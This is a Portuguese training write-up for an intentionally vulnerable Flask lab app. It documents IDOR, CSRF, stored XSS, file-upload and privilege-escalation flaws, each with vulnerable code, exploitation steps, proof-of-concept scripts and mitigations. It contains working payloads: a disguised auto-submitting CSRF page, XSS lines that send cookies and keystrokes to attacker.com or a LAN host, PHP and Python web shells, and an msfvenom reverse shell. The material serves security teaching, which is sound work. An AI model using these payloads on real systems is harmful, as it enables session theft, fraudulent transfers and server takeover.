# Lista Completa de 5 Vulnerabilidades - Siga em Frente

## Resumo Executivo

A máquina "Siga em Frente" foi desenvolvida com 5 vulnerabilidades críticas de segurança web propositalmente implementadas para fins educacionais. Este documento detalha cada vulnerabilidade, seu impacto, como explorá-la e as melhores práticas para mitigação.

---

## Vulnerabilidade 1: IDOR (Insecure Direct Object References)

### Classificação
- **OWASP Top 10:** A01:2021 - Broken Access Control
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
- **Severidade:** CRÍTICA
- **CVSS v3.1 Score:** 9.1 (Critical)

### Descrição

A vulnerabilidade IDOR ocorre quando um usuário consegue acessar recursos de outro usuário simplesmente alterando um parâmetro identificador (como um ID) na URL sem que o servidor valide adequadamente se o usuário autenticado tem permissão para acessar aquele recurso específico.

Na aplicação "Siga em Frente", cada dashboard é acessado através de um parâmetro `?id=<numero>` na URL:

```
http://localhost:5001/dashboard/operator?id=1
http://localhost:5001/dashboard/operator?id=2
http://localhost:5001/dashboard/operator?id=3
```

### Localização do Código Vulnerável

**Arquivo:** `siga.py` - Função `operator_dashboard()`

```python
@app.route('/dashboard/operator', methods=['GET'])
@login_required
def operator_dashboard():
    # VULNERABILIDADE: IDOR - Não valida se o usuário pode acessar este ID
    operator_id = request.args.get('id', type=int)
    
    if operator_id is None:
        return redirect(url_for('login'))
    
    operator = User.query.get(operator_id)
    
    if not operator or operator.role != 'operator':
        return "Operador não encontrado", 404
    
    # ... resto do código ...
    return render_template('operator_dashboard.html', operator=operator, booth=booth, messages=messages)
```

**O Problema:**
O código apenas verifica se `login_required` está ativo (se o usuário está autenticado), mas **nunca valida** se o usuário autenticado tem permissão para acessar o ID solicitado.

### Como Explorar

#### Cenário 1: Operador Acessando Dados de Outro Operador

1. Faça login como Igor (ID=1, Cabine 1)
   ```
   Usuário: Igor
   Senha: oper1-cab1
   ```

2. Após login, você é redirecionado para:
   ```
   http://localhost:5001/dashboard/operator?id=1
   ```

3. Altere manualmente a URL para acessar outro operador:
   ```
   http://localhost:5001/dashboard/operator?id=2  (Tiago - Cabine 1)
   http://localhost:5001/dashboard/operator?id=4  (Juan - Cabine 2)
   http://localhost:5001/dashboard/operator?id=7  (Amanda - Cabine 3)
   ```

4. Você poderá visualizar:
   - Dados do operador (nome, ID, cabine)
   - Veículos registrados na cabine dele
   - Valor em caixa da cabine dele
   - **Mensagens confidenciais** enviadas para aquele operador

#### Cenário 2: Acesso ao Dashboard Administrativo

1. Faça login como operador (por exemplo, Igor)

2. Altere manualmente a URL para:
   ```
   http://localhost:5001/dashboard/admin?id=101
   ```

3. Você conseguirá visualizar:
   - **Fluxo total de veículos** de todas as 3 cabines
   - **Saldo total em caixa** de todas as cabines
   - **Nomes e contatos** (telefones) de todos os 9 operadores

Este é um **vazamento crítico de informações** sensíveis da empresa.

### Impacto

- **Confidencialidade:** Severamente comprometida
  - Acesso não autorizado a mensagens internas
  - Exposição de dados operacionais (valores em caixa)
  - Exposição de dados pessoais (telefones de operadores)

- **Integridade:** Não é diretamente afetada (leitura apenas)

- **Disponibilidade:** Não é afetada

### Prova de Conceito (PoC)

```python
import requests

# Suponha que você descobriu a máquina está em 10.0.0.5:5001
target = "http://10.0.0.5:5001"

# Fazer login como um operador
login_data = {
    'username': 'Igor',
    'password': 'oper1-cab1'
}

session = requests.Session()
response = session.post(f"{target}/login", data=login_data)

# Agora você está autenticado, explore todos os dashboards
for operator_id in range(1, 10):
    dashboard_url = f"{target}/dashboard/operator?id={operator_id}"
    response = session.get(dashboard_url)
    print(f"[ID {operator_id}] Status: {response.status_code}")
    
    # Acesso ao dashboard administrativo
    admin_url = f"{target}/dashboard/admin?id=101"
    response = session.get(admin_url)
    print(f"[Admin Dashboard] Status: {response.status_code}")
```

### Mitigação e Boas Práticas

#### 1. Validação de Autorização

Sempre verifique se o usuário autenticado tem permissão para acessar o recurso:

```python
@app.route('/dashboard/operator', methods=['GET'])
@login_required
def operator_dashboard():
    current_user_id = session['user_id']
    requested_operator_id = request.args.get('id', type=int)
    
    current_user = User.query.get(current_user_id)
    
    # MITIGAÇÃO: Validar permissão
    if current_user.role == 'operator':
        # Operador só pode acessar seu próprio dashboard
        if current_user_id != requested_operator_id:
            return "Acesso negado", 403
    elif current_user.role == 'admin':
        # Admin pode acessar qualquer dashboard
        pass
    else:
        return "Acesso negado", 403
    
    # ... resto do código ...
```

#### 2. Usar Identificadores Opacos

Em vez de IDs sequenciais, use UUID ou tokens criptografados:

```python
from uuid import uuid4

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    uuid = db.Column(db.String(36), unique=True, default=lambda: str(uuid4()))
    # ...

# Usar na URL:
# /dashboard/operator?user=a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

#### 3. Logging e Auditoria

Registre todas as tentativas de acesso:

```python
def log_access(user_id, requested_id, resource, allowed):
    log_entry = AccessLog(
        user_id=user_id,
        accessed_resource=requested_id,
        resource_type=resource,
        granted=allowed,
        timestamp=datetime.utcnow()
    )
    db.session.add(log_entry)
    db.session.commit()
```

#### 4. Testes Automatizados

Implemente testes para garantir controle de acesso adequado:

```python
def test_operator_cannot_access_other_operators_dashboard():
    # Login como Igor
    response = client.post('/login', data={'username': 'Igor', 'password': 'oper1-cab1'})
    
    # Tentar acessar dashboard de outro operador
    response = client.get('/dashboard/operator?id=2')
    
    # Deve retornar 403, não sucesso
    assert response.status_code == 403
```

---

## Vulnerabilidade 2: CSRF (Cross-Site Request Forgery)

### Classificação
- **OWASP Top 10:** A01:2021 - Broken Access Control
- **CWE:** CWE-352 (Cross-Site Request Forgery - CSRF)
- **Severidade:** ALTA
- **CVSS v3.1 Score:** 8.1 (High)

### Descrição

A vulnerabilidade CSRF permite que um atacante force um usuário autenticado a executar ações indesejadas em uma aplicação web. O atacante cria uma página maliciosa que, quando visitada pelo usuário autenticado, executa uma ação no contexto de sua sessão autenticada.

Na aplicação "Siga em Frente", o formulário de transferência de fundos (`/transfer`) não implementa proteção contra CSRF usando tokens.

### Localização do Código Vulnerável

**Arquivo:** `siga.py` - Função `transfer()`

```python
@app.route('/transfer', methods=['GET', 'POST'])
@login_required
def transfer():
    operator_id = request.args.get('id', type=int)
    operator = User.query.get(operator_id)
    booth = Booth.query.filter_by(booth_number=operator.booth_id).first()
    max_transfer = booth.total_cash * 0.6
    
    if request.method == 'POST':
        # VULNERABILIDADE: CSRF - Sem token CSRF
        amount = float(request.form.get('amount', 0))
        destination_booth_id = int(request.form.get('destination_booth', 0))
        
        if amount > 0 and amount <= max_transfer:
            # Realizar transferência sem validação de origem
            destination_booth = Booth.query.get(destination_booth_id)
            
            if destination_booth:
                booth.total_cash -= amount
                destination_booth.total_cash += amount
                # ... salvar transferência ...
```

**O Problema:**
O formulário de transferência não implementa um token CSRF. Flask possui proteção CSRF via Flask-WTF, mas não foi utilizada aqui.

### Como Explorar

#### Preparação

1. Faça login como Igor (operador)
   ```
   Usuário: Igor
   Senha: oper1-cab1
   ```

2. Observe que você está logado e sua cabine (Cabine 1) tem saldo de R$ 2.850,50

#### Criação da Página de Exploit

1. Crie um arquivo `csrf_exploit.html`:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Promoção Imperdível - Ganhe Pontos!</title>
</head>
<body>
    <h1>🎁 Promoção de Perfume Premium!</h1>
    <p>Clique no botão abaixo para ganhar 10.000 pontos de fidelidade</p>
    
    <!-- Formulário CSRF oculto -->
    <form id="csrf-form" method="POST" action="http://localhost:5001/transfer" style="display:none;">
        <input type="hidden" name="amount" value="1000.00">
        <input type="hidden" name="destination_booth" value="2">
        <input type="hidden" name="id" value="1">
    </form>
    
    <!-- Botão que ativa o formulário -->
    <button onclick="document.getElementById('csrf-form').submit();">
        ✨ Ganhe Pontos Agora! ✨
    </button>
</body>
</html>
```

#### Execução do Ataque

1. Salve o arquivo `csrf_exploit.html` em seu computador

2. Enquanto estiver logado como Igor na aplicação Siga em Frente, abra este arquivo HTML em outro abas do navegador

3. Clique no botão "Ganhe Pontos Agora!"

4. Verifique o saldo de Igor (Cabine 1) - terá diminuído em R$ 1.000
5. Verifique o saldo da Cabine 2 - terá aumentado em R$ 1.000

**O operador foi vítima de uma transferência não autorizada sem seu consentimento!**

#### Variante com JavaScript

Uma forma mais sofisticada usando JavaScript puro:

```html
<html>
<body onload="document.forms[0].submit();">
<form method="POST" action="http://localhost:5001/transfer">
    <input type="hidden" name="amount" value="1710.30">
    <input type="hidden" name="destination_booth" value="3">
</form>
</body>
</html>
```

### Impacto

- **Confidencialidade:** Não é afetada diretamente
- **Integridade:** Severamente comprometida
  - Fundos são transferidos para contas inimigas
  - Registros de transferência são criados falsamente
  - Valores em caixa das cabines são alterados
- **Disponibilidade:** Afetada (perda de fundos)

**Impacto Financeiro Real:**
- Roubo direto de dinheiro
- Desfalque de caixa nas cabines
- Confusão operacional

### Prova de Conceito (PoC) - Automatizada

```python
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By

# Iniciar navegador controlado
driver = webdriver.Chrome()

# 1. Login como operador
driver.get("http://localhost:5001/login")
driver.find_element(By.ID, "username").send_keys("Igor")
driver.find_element(By.ID, "password").send_keys("oper1-cab1")
driver.find_element(By.TAG_NAME, "button").click()

# 2. Armazenar sessão
session_cookie = driver.get_cookie('session')

# 3. Executar formulário CSRF
csrf_html = """
<form method="POST" action="http://localhost:5001/transfer">
    <input type="hidden" name="amount" value="1500.00">
    <input type="hidden" name="destination_booth" value="3">
</form>
"""

driver.execute_script(f"""
    document.body.innerHTML = '{csrf_html}';
    document.forms[0].submit();
""")

# Aguardar redirecionamento
import time
time.sleep(2)

# Confirmar sucesso
print("Saldo atual:", driver.find_element(By.CLASS_NAME, "value").text)
```

### Mitigação e Boas Práticas

#### 1. Implementar Tokens CSRF

Usar Flask-WTF para gerar e validar tokens:

```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

@app.route('/transfer', methods=['POST'])
@login_required
@csrf.protect  # Proteção CSRF automática
def transfer():
    # ... código ...
```

#### 2. No Template HTML

```html
<form method="POST" action="{{ url_for('transfer') }}">
    <!-- Token CSRF obrigatório -->
    {{ csrf_token() }}
    
    <input type="hidden" name="amount" value="">
    <input type="hidden" name="destination_booth" value="">
    <button type="submit">Transferir</button>
</form>
```

#### 3. Validação de Origem (Referer/Origin)

```python
def validate_origin():
    referer = request.referrer
    origin = request.headers.get('Origin')
    allowed_hosts = ['localhost:5001', 'sigaemfrente.com']
    
    if not referer or not any(host in referer for host in allowed_hosts):
        return False
    return True

@app.route('/transfer', methods=['POST'])
@login_required
def transfer():
    if not validate_origin():
        return "Acesso negado", 403
    # ... código ...
```

#### 4. SameSite Cookie Attribute

```python
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
```

#### 5. Confirmação em Duas Etapas

Para ações sensíveis, adicionar confirmação adicional:

```python
@app.route('/transfer', methods=['POST'])
@login_required
def transfer():
    # Etapa 1: Validar token CSRF
    csrf.protect()
    
    # Etapa 2: Validar autorização
    if not user_owns_booth(current_user_id, source_booth_id):
        return "Acesso negado", 403
    
    # Etapa 3: Gerar token de confirmação
    confirmation_token = secrets.token_hex(32)
    cache.set(f"transfer_{user_id}", confirmation_token, timeout=300)
    
    # Etapa 4: Exigir confirmação com o token
    if request.form.get('confirmation_token') != confirmation_token:
        return "Confirmação inválida", 400
```

---

## Vulnerabilidade 3: XSS (Cross-Site Scripting) - Armazenado

### Classificação
- **OWASP Top 10:** A03:2021 - Injection
- **CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **Severidade:** ALTA
- **CVSS v3.1 Score:** 7.1 (High)

### Descrição

A vulnerabilidade XSS (Cross-Site Scripting) armazenado ocorre quando dados não sanitizados fornecidos por um usuário (neste caso, um administrador) são salvos no banco de dados e subsequentemente exibidos para outros usuários sem codificação HTML apropriada.

Na aplicação "Siga em Frente", as mensagens enviadas pelos administradores para os operadores são armazenadas no banco de dados e exibidas sem escape HTML, permitindo a injeção de JavaScript malicioso.

### Localização do Código Vulnerável

**Arquivo:** `siga.py` - Função `send_message()`

```python
@app.route('/message', methods=['POST'])
@login_required
def send_message():
    user = User.query.get(session['user_id'])
    
    if user.role != 'admin':
        return jsonify({'error': 'Acesso negado'}), 403
    
    recipient_id = int(request.form.get('recipient_id'))
    content = request.form.get('content')
    
    # VULNERABILIDADE: XSS Armazenado - Sem sanitização do conteúdo
    message = Message(
        sender_id=user.id,
        recipient_id=recipient_id,
        content=content  # Armazenado diretamente sem sanitização
    )
    
    db.session.add(message)
    db.session.commit()
    
    return jsonify({'success': 'Mensagem enviada'})
```

**Arquivo:** `templates/operator_dashboard.html` - Exibição da mensagem

```html
<div class="message-content">
    {{ msg.content }}  <!-- XSS: Sem escape HTML -->
</div>
```

**Arquivo:** `siga.py` - Rota de retorno de mensagens

```python
@app.route('/messages/<int:operator_id>')
@login_required
def get_messages(operator_id):
    messages = Message.query.filter_by(recipient_id=operator_id).all()
    return jsonify([{
        'id': m.id,
        'sender': m.sender.full_name,
        'content': m.content,  # XSS: Sem escape HTML
        'timestamp': m.timestamp.strftime('%d/%m/%Y %H:%M:%S')
    } for m in messages])
```

### Como Explorar

#### Fase 1: Login como Administrador

1. Faça login como administrador
   ```
   Usuário: mario (ou bruno)
   Senha: [senha aleatória gerada durante init_db.py]
   ```

2. Acesse o painel administrativo em `/dashboard/admin?id=101`

#### Fase 2: Injetar Payload XSS

1. No campo "Enviar Mensagem para Operador", selecione um operador (ex: Igor)

2. No campo de mensagem, insira um payload XSS:

```javascript
<img src=x onerror="alert('XSS Executado! Você foi hackeado!')">
```

3. Clique em "Enviar Mensagem"

#### Fase 3: Vítima Visualiza a Mensagem

1. Faça logout ou use outra sessão
2. Faça login como Igor (operador)
   ```
   Usuário: Igor
   Senha: oper1-cab1
   ```

3. Acesse seu dashboard (`/dashboard/operator?id=1`)

4. **O JavaScript será executado no navegador de Igor**, exibindo um alert com a mensagem "XSS Executado! Você foi hackeado!"

#### Payloads XSS Avançados

**Roubar Cookie de Sessão:**
```html
<img src=x onerror="
  fetch('http://192.168.1.11/log.php', {
    method: 'POST',
    body: 'cookie=' + document.cookie,
    headers: {'Content-Type': 'application/x-www-form-urlencoded'}
  })
">
```

**Redirecionar para Página de Phishing:**
```html
<img src=x onerror="window.location='http://attacker.com/fake-login.html'">
```

**Keylogger:**
```html
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
};
</script>
```

**Alterar Conteúdo da Página:**
```html
<script>
document.body.innerHTML = '<h1>Sistema Comprometido!</h1>';
</script>
```

**Executar Ações em Nome do Usuário:**
```html
<form id="csrf" method="POST" action="/transfer" style="display:none;">
    <input name="amount" value="1000">
    <input name="destination_booth" value="2">
</form>
<img src=x onerror="document.getElementById('csrf').submit()">
```

### Impacto

- **Confidencialidade:** Severamente comprometida
  - Roubo de cookies de sessão
  - Roubo de dados sensíveis
  - Espionagem de dados digitados (keylogging)

- **Integridade:** Severamente comprometida
  - Alteração de conteúdo da página
  - Execução de ações não autorizadas
  - Redirecionamento malicioso

- **Disponibilidade:** Afetada
  - Redirecionamento para phishing
  - Lentidão ou crash da página

### Prova de Conceito (PoC)

```python
import requests

# Credenciais do admin
admin_credentials = {
    'username': 'mario',
    'password': 'admin_password_aqui'
}

target = "http://localhost:5001"
session = requests.Session()

# 1. Login como admin
session.post(f"{target}/login", data=admin_credentials)

# 2. Enviar payload XSS
xss_payload = '<img src=x onerror="alert(\'XSS\')">'
message_data = {
    'recipient_id': '1',  # Igor
    'content': xss_payload
}

response = session.post(f"{target}/message", data=message_data)
print(f"XSS enviado: {response.json()}")

# 3. Confirmar que o payload foi armazenado
response = session.get(f"{target}/messages/1")
messages = response.json()
print(f"Conteúdo armazenado: {messages[0]['content']}")
# Saída: <img src=x onerror="alert('XSS')">
# Confirmando XSS armazenado!
```

### Mitigação e Boas Práticas

#### 1. Escape HTML no Template (Jinja2)

```html
<!-- INSEGURO (antes) -->
<div class="message-content">{{ msg.content }}</div>

<!-- SEGURO (depois) -->
<div class="message-content">{{ msg.content | e }}</div>
```

No Flask/Jinja2, use o filtro `|e` para escape HTML.

#### 2. Sanitização no Backend

```python
from markupsafe import escape

@app.route('/message', methods=['POST'])
@login_required
def send_message():
    user = User.query.get(session['user_id'])
    
    if user.role != 'admin':
        return jsonify({'error': 'Acesso negado'}), 403
    
    recipient_id = int(request.form.get('recipient_id'))
    content = request.form.get('content')
    
    # MITIGAÇÃO: Escapar HTML
    content_safe = escape(content)
    
    message = Message(
        sender_id=user.id,
        recipient_id=recipient_id,
        content=str(content_safe)
    )
    
    db.session.add(message)
    db.session.commit()
    
    return jsonify({'success': 'Mensagem enviada'})
```

#### 3. Usar Biblioteca de Sanitização

```python
from bleach import clean

# Permitir apenas tags seguras
ALLOWED_TAGS = ['b', 'i', 'u', 'p', 'br']
ALLOWED_ATTRIBUTES = {}

@app.route('/message', methods=['POST'])
@login_required
def send_message():
    content = request.form.get('content')
    
    # MITIGAÇÃO: Sanitizar conteúdo
    content_safe = clean(content, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRIBUTES)
    
    message = Message(
        sender_id=session['user_id'],
        recipient_id=int(request.form.get('recipient_id')),
        content=content_safe
    )
    
    db.session.add(message)
    db.session.commit()
```

#### 4. Content Security Policy (CSP)

Adicionar header CSP ao Flask:

```python
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
    return response
```

#### 5. Validação de Entrada

```python
import re

def validate_message_content(content):
    # Aceitar apenas caracteres alfanuméricos, pontuação comum e espaços
    if not re.match(r"^[a-zA-Z0-9áéíóú\s.,!?-]+$", content):
        return False
    
    # Verificar tamanho máximo
    if len(content) > 1000:
        return False
    
    return True

@app.route('/message', methods=['POST'])
@login_required
def send_message():
    content = request.form.get('content')
    
    if not validate_message_content(content):
        return jsonify({'error': 'Conteúdo inválido'}), 400
    
    # ... resto do código ...
```

---

## Vulnerabilidade 4: File Upload Vulnerável

### Classificação
- **OWASP Top 10:** A04:2021 - Insecure Design & A06:2021 - Vulnerable and Outdated Components
- **CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)
- **Severidade:** CRÍTICA
- **CVSS v3.1 Score:** 8.8 (High)

### Descrição

A vulnerabilidade de upload de arquivo vulnerável ocorre quando a aplicação não valida adequadamente os tipos e conteúdo dos arquivos enviados pelos usuários. Na aplicação "Siga em Frente", o dashboard administrativo permite upload de arquivos, mas a validação é feita apenas no cliente (JavaScript), permitindo o envio de arquivos perigosos.

### Localização do Código Vulnerável

**Arquivo:** `siga.py` - Função `files()`

```python
@app.route('/files', methods=['GET', 'POST'])
@login_required
def files():
    user = User.query.get(session['user_id'])
    
    if request.method == 'POST':
        if 'file' not in request.files:
            return render_template('files.html', error='Nenhum arquivo selecionado'), 400
        
        file = request.files['file']
        
        if file.filename == '':
            return render_template('files.html', error='Nenhum arquivo selecionado'), 400
        
        # VULNERABILIDADE: Não valida a extensão corretamente (apenas salvando)
        filename = file.filename
        
        # Salvar arquivo SEM validação de segurança
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)  # Salva arquivo perigoso!
        
        # Registrar no banco de dados
        file_upload = FileUpload(
            filename=filename,
            uploader_id=user.id
        )
        
        db.session.add(file_upload)
        db.session.commit()
        
        return render_template('files.html', success='Upload realizado com sucesso')
    
    return render_template('files.html')
```

**Arquivo:** `templates/admin_dashboard.html` - Validação de Cliente

```html
<!-- INSEGURO: Validação apenas no navegador -->
<input type="file" id="file" name="file" accept=".docx,.pdf,.eml,.msg" required>
```

**O Problema:**
- A validação é feita apenas no **lado do cliente** (navegador)
- O servidor **não valida** a extensão do arquivo
- O servidor **não verifica** o conteúdo do arquivo (magic bytes)
- Arquivos são salvos em uma **pasta acessível via web**
- Não há renomeação ou isolamento de arquivos enviados

### Como Explorar

#### Exploração 1: Bypass de Validação de Extensão

**Método 1: Usando cURL**

```bash
# Criar um arquivo malicioso em Python
echo 'print("Backdoor executado!")' > backdoor.py

# Renomear para contornar validação
mv backdoor.py backdoor.msg

# Fazer login e pegar sessão
curl -c cookies.txt \
  -d "username=mario&password=SENHA_AQUI" \
  http://localhost:5001/login

# Enviar arquivo "renomeado"
curl -b cookies.txt \
  -F "file=@backdoor.msg" \
  http://localhost:5001/files

# Arquivo malicioso foi salvo como 'backdoor.msg'
# Pode ser renomeado ou executado conforme necessário
```

**Método 2: Remover Extensão**

```bash
# Criar arquivo PHP malicioso
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Enviar como shell.docx durante upload
# O servidor salva como 'shell.docx'

# Renomear no servidor (se tiver acesso via outro exploit)
mv shell.docx shell.php

# Acessar: http://localhost:5001/uploads/shell.php?cmd=id
```

**Método 3: Upload de Arquivo Executável**

```bash
# Criar executável .exe ou .elf
# Windows:
echo @echo Backdoor > backdoor.bat
# ou backdoor.exe

# Linux:
touch backdoor.elf

# Upload como .docx e depois executar
```

#### Exploração 2: Upload de Arquivo Web Shell

```html
<!-- Salvar como malicious.pdf -->
<?php
system($_GET['cmd']);
?>
```

Ou em Python:

```python
@app.route('/shell')
def shell():
    cmd = request.args.get('cmd')
    output = os.popen(cmd).read()
    return output
```

#### Exploração 3: Criar Shell Interativo

```bash
# 1. Enviar arquivo reverse shell
msfvenom -p php/reverse_php LHOST=attacker.com LPORT=4444 > shell.pdf

# 2. Servidor Flask salva como shell.pdf
# 3. Renomear (via outro exploit) para shell.php
# 4. Acessar reverse shell interativo
nc -nvlp 4444
```

### Impacto

- **Confidencialidade:** Severamente comprometida
  - Leitura de arquivos do servidor
  - Acesso ao código-fonte
  - Vazamento de variáveis de ambiente

- **Integridade:** Severamente comprometida
  - Execução de código malicioso
  - Alteração de arquivos do servidor
  - Modificação do banco de dados

- **Disponibilidade:** Severamente comprometida
  - Denial of Service (encher disco)
  - Crash da aplicação
  - Comprometimento total do servidor

### Prova de Conceito (PoC)

```python
import requests
import os

target = "http://localhost:5001"
admin_creds = {
    'username': 'mario',
    'password': 'admin_password'
}

# 1. Login como admin
session = requests.Session()
session.post(f"{target}/login", data=admin_creds)

# 2. Criar arquivo malicioso
malicious_code = """
import os
os.system('whoami')
"""

with open('exploit.py', 'w') as f:
    f.write(malicious_code)

# 3. Enviar como .pdf (bypass de validação)
with open('exploit.py', 'rb') as f:
    files = {'file': ('exploit.pdf', f)}
    response = session.post(f"{target}/files", files=files)
    print(f"Upload status: {response.status_code}")

# 4. Arquivo está acessível em /uploads/exploit.pdf
print(f"Arquivo salvo em: {target}/uploads/exploit.pdf")

# 5. Se houver outro exploit para renomear ou executar,
#    arquivo malicioso será ativado
```

### Mitigação e Boas Práticas

#### 1. Validação de Extensão no Servidor

```python
ALLOWED_EXTENSIONS = {'docx', 'pdf', 'eml', 'msg'}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/files', methods=['POST'])
@login_required
def files():
    file = request.files['file']
    
    # MITIGAÇÃO: Validar extensão no servidor
    if not allowed_file(file.filename):
        return 'Extensão não permitida', 400
    
    # ... resto do código ...
```

#### 2. Validação de Magic Bytes (Tipo MIME)

```python
import magic

ALLOWED_MIMETYPES = {
    'application/vnd.openxmlformats-officedocument.wordprocessingml.document',  # .docx
    'application/pdf',  # .pdf
    'message/rfc822',   # .eml
    'application/vnd.ms-outlook'  # .msg
}

@app.route('/files', methods=['POST'])
@login_required
def files():
    file = request.files['file']
    
    # MITIGAÇÃO: Validar magic bytes
    mime = magic.Magic(mime=True)
    file_mime = mime.from_buffer(file.read(1024))
    file.seek(0)
    
    if file_mime not in ALLOWED_MIMETYPES:
        return 'Tipo de arquivo não permitido', 400
    
    # ... resto do código ...
```

#### 3. Renomear Arquivo para Nome Seguro

```python
from uuid import uuid4
import os

@app.route('/files', methods=['POST'])
@login_required
def files():
    file = request.files['file']
    
    if not allowed_file(file.filename):
        return 'Extensão não permitida', 400
    
    # MITIGAÇÃO: Renomear para UUID
    ext = file.filename.rsplit('.', 1)[1].lower()
    safe_filename = f"{uuid4()}.{ext}"
    
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], safe_filename)
    file.save(filepath)
    
    # Armazenar nome original no banco para auditoria
    file_upload = FileUpload(
        filename=safe_filename,
        original_filename=file.filename,
        uploader_id=session['user_id']
    )
    db.session.add(file_upload)
    db.session.commit()
```

#### 4. Armazenar Fora da Pasta Web

```python
# Salvar em diretório fora da raiz web
UPLOAD_FOLDER = '/var/uploads/siga-em-frente'  # Fora de /static ou /public
```

#### 5. Limitar Tamanho de Arquivo

```python
app.config['MAX_CONTENT_LENGTH'] = 5 * 1024 * 1024  # 5 MB

@app.route('/files', methods=['POST'])
@login_required
def files():
    file = request.files['file']
    
    # MITIGAÇÃO: Verificar tamanho
    if len(file.read()) > 5 * 1024 * 1024:
        return 'Arquivo muito grande (máximo 5 MB)', 400
    
    file.seek(0)  # Resetar posição de leitura
    # ... resto do código ...
```

#### 6. Desabilitar Execução de Scripts

```apache
# .htaccess (Apache)
<FilesMatch "\.(php|phtml|php3|php4|php5|phtml|pl|py|jsp|asp|aspx|cgi|sh|bat|exe|com)$">
    Deny from all
</FilesMatch>
```

ou

```nginx
# nginx.conf
location /uploads/ {
    location ~ \.(php|phtml|php3|php4|php5|phtml|pl|py|jsp|asp|aspx|cgi|sh|bat|exe|com)$ {
        return 403;
    }
}
```

#### 7. Implementar Antivírus/Malware Scanner

```python
import pyclamd

@app.route('/files', methods=['POST'])
@login_required
def files():
    file = request.files['file']
    
    # MITIGAÇÃO: Verificar com ClamAV
    clam = pyclamd.ClamD()
    
    if clam.scan_stream(file.read()):
        return 'Arquivo contém malware detectado', 400
    
    file.seek(0)
    # ... resto do código ...
```

---

## Tabela Resumida de Vulnerabilidades

| Vulnerabilidade | OWASP | Severidade | Endpoints Afetados | Impacto Principal |
|---|---|---|---|---|
| IDOR | A01:2021 | CRÍTICA | `/dashboard/operator?id=X` `/dashboard/admin?id=101` | Vazamento de dados confidenciais |
| CSRF | A01:2021 | ALTA | `/transfer` | Roubo de fundos não autorizado |
| XSS Armazenado | A03:2021 | ALTA | `/message` (armazenamento) `/messages/<id>` (exibição) | Roubo de sessão, redirecionamento malicioso |
| File Upload | A04:2021 | CRÍTICA | `/files` | Execução de código arbitrário |

## Recomendações Gerais de Segurança

1. **Autenticação e Autorização:** Implementar verificações rigorosas em todos os endpoints
2. **Validação de Entrada:** Validar TODOS os dados de entrada no servidor
3. **Sanitização de Saída:** Escapar dados antes de exibir em HTML
4. **HTTPS:** Usar SSL/TLS em produção
5. **Logging e Auditoria:** Registrar todas as ações críticas
6. **Testes de Segurança:** Realizar pentests regularmente
7. **Atualizações:** Manter dependências atualizadas
8. **Princípio do Menor Privilégio:** Cada usuário/aplicação tem apenas permissões necessárias

---

**Documentação preparada por:** AulasHack
**Data de atualização:** Janeiro 2026
**Versão:** 1.0

---

## Vulnerabilidade 5: Privilege Escalation (Elevação de Privilégio) ⭐ NOVO

### Classificação
- **OWASP Top 10:** A01:2021 - Broken Access Control
- **CWE:** CWE-269 (Improper Handling of Privileges), CWE-639 (Authorization Bypass)
- **Severidade:** CRÍTICA
- **CVSS v3.1 Score:** 9.1 (Critical)
- **Tipo:** Vertical Privilege Escalation

### Descrição

A Escalação de Privilégio ocorre quando um usuário com nível de privilégio baixo (Operador) consegue executar ações reservadas para usuários com privilégios mais altos (Administrador), elevando seus direitos de forma não autorizada.

### Cenário de Exploração

Um operador consegue:
1. Acessar o dashboard de admin alterando `?id=101`
2. Enviar mensagens como se fosse administrador
3. Ver dados globais de todas as cabines
4. Fazer upload de arquivos (privilégio de admin)

### Impactos

- Sabotagem corporativa (enviar instruções falsas)
- Roubo de informações (espionagem)
- Dano à reputação (mensagens inapropriadas)
- Fraude financeira (transferências não autorizadas)

### Exploração

```bash
# 1. Login como operador Igor
curl -c cookies.txt -X POST http://127.0.0.1:5001/login \
  -d "username=Igor&password=oper1-cab1"

# 2. Acessar dashboard de admin (IDOR + Privilege Escalation)
curl -b cookies.txt http://127.0.0.1:5001/dashboard/admin?id=101

# 3. Enviar mensagem como admin
curl -b cookies.txt -X POST http://127.0.0.1:5001/message \
  -d "recipient_id=2&content=Transferência urgente para cabine 1"
```

### Mitigação

Use decorators para validar privilégios ANTES de executar:

```python
def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        
        user = db.session.get(User, session['user_id'])
        if not user or user.role != 'admin':
            return jsonify({'error': 'Acesso negado'}), 403
        
        return f(*args, **kwargs)
    return decorated_function

@app.route('/dashboard/admin')
@admin_required
def admin_dashboard():
    ...
```

---

**Desenvolvido por: AulasHack**
**Data: 1º de fevereiro de 2026**
**Versão: 1.0 com 5 Vulnerabilidades**
**Atualizado para incluir: Privilege Escalation**

